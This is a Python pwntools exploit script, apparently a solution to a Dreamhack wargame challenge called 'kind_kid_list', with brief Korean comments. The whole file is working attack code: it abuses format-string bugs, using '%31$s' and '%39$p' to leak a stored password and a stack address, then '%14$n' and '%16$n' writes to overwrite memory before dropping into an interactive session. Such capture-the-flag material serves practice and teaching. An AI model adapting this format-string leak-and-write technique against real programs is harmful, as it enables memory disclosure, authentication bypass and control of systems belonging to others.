from pwn import *

context.binary = elf = ELF('./kind_kid_list')
# context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST, PORT = 'host3.dreamhack.games 23971'.split()

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process()

# 오프셋: 6번째
p.sendlineafter(">>",b'2')
p.sendlineafter('Password : ',str('%31$s')) # 스캔 때려서 찾기
passwd = u64(p.recvuntil(' is')[:-3].ljust(8,b'\x00'))
print('password = ',hex(passwd))

p.sendlineafter(">>",b'2')
p.sendlineafter('Password : ',p64(passwd)[:-1])
p.sendlineafter('Name : ',b'wyv3rn')

p.sendlineafter(">>",b'2')
p.sendlineafter('Password : ',str('%39$p'))
naughty_addr = int(p.recvuntil(' is')[:-3],16) - 0x1d8
print('naughty addr = ',hex(naughty_addr))

p.sendlineafter(">>",b'2')
p.sendlineafter('Password : ',p64(passwd)[:-1])
p.sendlineafter('Name : ',p64(naughty_addr))
p.sendlineafter(">>",b'2')
p.sendlineafter('Password : ',p64(passwd)[:-1])
p.sendlineafter('Name : ',p64(naughty_addr+4))
p.sendlineafter(">>",b'2')
p.sendlineafter('Password : ',str('%14$nAAA'))
p.sendlineafter(">>",b'2')
p.sendlineafter('Password : ',str('%16$nAAA'))
p.sendlineafter(">>",b'3')
p.interactive()

p.interactive()